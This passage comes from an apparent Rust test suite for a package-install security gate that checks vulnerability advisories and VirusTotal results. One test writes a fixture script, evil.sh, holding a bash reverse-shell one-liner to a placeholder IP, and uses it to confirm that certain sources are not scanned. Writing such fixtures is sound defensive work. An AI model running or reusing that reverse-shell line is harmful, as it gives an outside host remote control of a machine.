    let pkg = Package {
        source: PackageSource::GitHub {
            owner: "o".to_string(),
            repo: "tool".to_string(),
        },
        ..Package::new("tool", "1.0.0")
    };

    assert!(referee_with_vt(&server.base_url)
        .screen_artifact(&pkg, &tree)
        .unwrap()
        .is_empty());
    let _ = std::fs::remove_dir_all(&tree);
}

#[test]
fn test_an_unreachable_virustotal_never_decides_an_install() {
    let server = MockServer::start(|request| {
        if request.path.starts_with("/vt/files/") {
            return (500, "{}".to_string());
        }
        (200, batch(&[&[]]))
    });
    let tree = scratch("vt_down");
    let binary = tree.join("tool");
    std::fs::write(&binary, b"harmless").unwrap();
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        std::fs::set_permissions(&binary, std::fs::Permissions::from_mode(0o755)).unwrap();
    }

    let pkg = Package {
        source: PackageSource::GitHub {
            owner: "o".to_string(),
            repo: "tool".to_string(),
        },
        ..Package::new("tool", "1.0.0")
    };

    // An outage at a third party is a non-answer, not a verdict.
    assert!(referee_with_vt(&server.base_url)
        .screen_artifact(&pkg, &tree)
        .unwrap()
        .is_empty());
    let _ = std::fs::remove_dir_all(&tree);
}

#[test]
fn test_an_unknown_hash_is_not_a_finding() {
    let server = MockServer::start(|request| {
        if request.path.starts_with("/vt/files/") {
            return (404, "{}".to_string());
        }
        (200, batch(&[&[]]))
    });
    let tree = scratch("vt_unknown");
    let binary = tree.join("tool");
    std::fs::write(&binary, b"brand new build").unwrap();
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        std::fs::set_permissions(&binary, std::fs::Permissions::from_mode(0o755)).unwrap();
    }

    let pkg = Package {
        source: PackageSource::GitHub {
            owner: "o".to_string(),
            repo: "tool".to_string(),
        },
        ..Package::new("tool", "1.0.0")
    };

    assert!(referee_with_vt(&server.base_url)
        .screen_artifact(&pkg, &tree)
        .unwrap()
        .is_empty());
    let _ = std::fs::remove_dir_all(&tree);
}

#[test]
fn test_no_api_key_means_no_virustotal_request_at_all() {
    let server = MockServer::start(|_| (200, batch(&[&[]])));
    let tree = scratch("vt_off");
    let binary = tree.join("tool");
    std::fs::write(&binary, b"harmless").unwrap();
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        std::fs::set_permissions(&binary, std::fs::Permissions::from_mode(0o755)).unwrap();
    }

    let pkg = Package {
        source: PackageSource::GitHub {
            owner: "o".to_string(),
            repo: "tool".to_string(),
        },
        ..Package::new("tool", "1.0.0")
    };

    referee(&server.base_url, FailPolicy::FailOpen)
        .screen_artifact(&pkg, &tree)
        .unwrap();
    assert_eq!(server.request_count(), 0);
    let _ = std::fs::remove_dir_all(&tree);
}

#[test]
fn test_phase_b_never_scans_a_source_that_ships_no_artifact() {
    let server = MockServer::start(|_| (200, batch(&[&[]])));
    let tree = scratch("phaseb_system");
    std::fs::write(
        tree.join("evil.sh"),
        "#!/bin/sh\nbash -i >& /dev/tcp/1.2.3.4/9 0>&1\n",
    )
    .unwrap();

    let referee = referee(&server.base_url, FailPolicy::FailOpen);
    for source in [
        PackageSource::System {
            manager: "apt".to_string(),
        },
        PackageSource::Cargo {
            crate_name: "tool".to_string(),
        },
    ] {
        let pkg = Package {
            source,
            ..Package::new("tool", "1.0.0")
        };
        assert!(referee.screen_artifact(&pkg, &tree).unwrap().is_empty());
    }
    let _ = std::fs::remove_dir_all(&tree);
}

#[test]
fn test_a_large_plan_is_split_into_batches_and_stays_aligned() {
    // 150 packages is more than one batch; the 101st result must still land on
    // the 101st package.
    let server = MockServer::start(|request| {
        if request.path.starts_with("/v1/vulns/") {
            return (
                200,
                record("GHSA-x", "crates.io", "pkg-120", CRITICAL).to_string(),
            );
        }
        let queries: Value = serde_json::from_str(&request.body).unwrap();
        let hits: Vec<Value> = queries["queries"]
            .as_array()
            .unwrap()
            .iter()
            .map(|query| {
                if query["package"]["name"] == "pkg-120" {
                    json!({ "vulns": [{ "id": "GHSA-x" }] })
                } else {
                    json!({ "vulns": [] })
                }
            })
            .collect();
        (200, json!({ "results": hits }).to_string())
    });
    let dir = scratch("bigplan");
    let db = db_in(&dir);

    let plan: Vec<Package> = (0..150)
        .map(|i| crate_pkg(&format!("pkg-{}", i), "1.0.0"))
        .collect();

    let outcome = referee(&server.base_url, FailPolicy::FailOpen)
        .gate(&db, &plan)
        .unwrap();

    assert_eq!(outcome.reports.len(), 150);
    assert_eq!(outcome.blocked().len(), 1);
    assert_eq!(outcome.blocked()[0].name, "pkg-120");
    // Two batches of 100 and 50.
    assert_eq!(
        server
            .requests()
            .iter()
            .filter(|request| request.path == "/v1/querybatch")
            .count(),
        2
    );
    let _ = std::fs::remove_dir_all(&dir);
}

#[test]
fn test_an_advisory_detail_is_fetched_once_for_a_whole_plan() {
    let server = MockServer::start(|request| {
        if request.path.starts_with("/v1/vulns/") {
            return (
                200,
                record("GHSA-shared", "crates.io", "a", MEDIUM).to_string(),
            );
        }
        (
            200,
            batch(&[&["GHSA-shared"], &["GHSA-shared"], &["GHSA-shared"]]),
        )
    });
    let dir = scratch("hydrateonce");
    let db = db_in(&dir);

    referee(&server.base_url, FailPolicy::FailOpen)
        .gate(
            &db,
            &[
                crate_pkg("a", "1.0.0"),
                crate_pkg("b", "1.0.0"),
                crate_pkg("c", "1.0.0"),
            ],
        )
        .unwrap();

    let detail_requests = server
        .requests()
        .iter()
        .filter(|request| request.path.starts_with("/v1/vulns/"))
        .count();
    assert_eq!(detail_requests, 1);
    let _ = std::fs::remove_dir_all(&dir);
}

#[test]
fn test_an_unfetchable_detail_still_reports_the_advisory() {
    let server = MockServer::start(|request| {
        if request.path.starts_with("/v1/vulns/") {
            return (500, "{}".to_string());
        }
        (200, batch(&[&["GHSA-opaque"]]))
    });
    let dir = scratch("opaque");
    let db = db_in(&dir);

    let outcome = referee(&server.base_url, FailPolicy::FailOpen)
        .gate(&db, &[crate_pkg("serde", "1.0.229")])
        .unwrap();

    // The batch said this version is affected. Not being able to read the
    // detail costs the score, not the finding.
    assert!(outcome.reports[0].status().is_vulnerable());
    assert_eq!(outcome.reports[0].risk(), None);
    assert_eq!(outcome.warned().len(), 1);
    assert_eq!(outcome.reports[0].advisories()[0].id, "GHSA-opaque");
    let _ = std::fs::remove_dir_all(&dir);
}

#[test]
fn test_a_detailed_batch_answer_needs_no_second_request() {
    // A self-hosted or proxying service may answer the batch in full.
    let server = MockServer::start(|_| {
        (
            200,
            json!({
                "results": [{
                    "vulns": [record("GHSA-inline", "crates.io", "serde", CRITICAL)]
                }]
            })
            .to_string(),
        )
    });
    let dir = scratch("inline");
    let db = db_in(&dir);

    let outcome = referee(&server.base_url, FailPolicy::FailOpen)
        .gate(&db, &[crate_pkg("serde", "1.0.229")])
        .unwrap();

    assert_eq!(outcome.blocked().len(), 1);
    assert_eq!(server.request_count(), 1);
    let _ = std::fs::remove_dir_all(&dir);
}

#[test]
fn test_a_short_batch_response_does_not_shift_verdicts() {
    // A service that answers two queries with one result must not make the
    // first package's advisory land on the second.
    let server = MockServer::start(|request| {
        if request.path.starts_with("/v1/vulns/") {
            return (
                200,
                record("GHSA-first", "crates.io", "a", CRITICAL).to_string(),
            );
        }
        (200, batch(&[&["GHSA-first"]]))
    });
    let dir = scratch("shortbatch");
    let db = db_in(&dir);

    let outcome = referee(&server.base_url, FailPolicy::FailOpen)
        .gate(&db, &[crate_pkg("a", "1.0.0"), crate_pkg("b", "1.0.0")])
        .unwrap();

    assert_eq!(outcome.reports.len(), 2);
    assert_eq!(outcome.reports[0].name, "a");
    assert!(outcome.reports[0].status().is_vulnerable());
    assert_eq!(outcome.reports[1].name, "b");
    assert_eq!(outcome.reports[1].status(), Verdict::Clean);
    let _ = std::fs::remove_dir_all(&dir);
}

#[test]
fn test_gate_json_carries_every_package() {
    let server = MockServer::start(|_| (200, batch(&[&[], &[]])));
    let dir = scratch("json");
    let db = db_in(&dir);

    let outcome = referee(&server.base_url, FailPolicy::FailOpen)
        .gate(&db, &[crate_pkg("a", "1.0.0"), crate_pkg("b", "2.0.0")])
        .unwrap();

    let json = outcome.to_json();
    assert_eq!(json["enabled"], true);
    assert_eq!(json["packages"].as_array().unwrap().len(), 2);
    assert_eq!(json["packages"][0]["name"], "a");
    assert_eq!(json["packages"][0]["status"], "clean");
    assert_eq!(json["packages"][0]["band"], "pass");
    assert_eq!(json["packages"][0]["source"], "cargo:a");
    assert_eq!(json["packages"][1]["version"], "2.0.0");
    let _ = std::fs::remove_dir_all(&dir);
}

#[test]
fn test_an_empty_plan_asks_nothing() {
    let server = MockServer::start(|_| (200, batch(&[])));
    let dir = scratch("emptyplan");
    let db = db_in(&dir);

    let outcome = referee(&server.base_url, FailPolicy::FailOpen)
        .gate(&db, &[])
        .unwrap();

    assert!(outcome.reports.is_empty());
    assert_eq!(server.request_count(), 0);
    let _ = std::fs::remove_dir_all(&dir);
}

#[test]
fn test_a_malformed_response_fails_open() {
    let server = MockServer::start(|_| (200, "this is not json".to_string()));
    let dir = scratch("malformed");
    let db = db_in(&dir);

    let outcome = referee(&server.base_url, FailPolicy::FailOpen)
        .gate(&db, &[crate_pkg("serde", "1.0.229")])
        .unwrap();

    assert_eq!(outcome.reports[0].status(), Verdict::Unverified);
    let _ = std::fs::remove_dir_all(&dir);
}
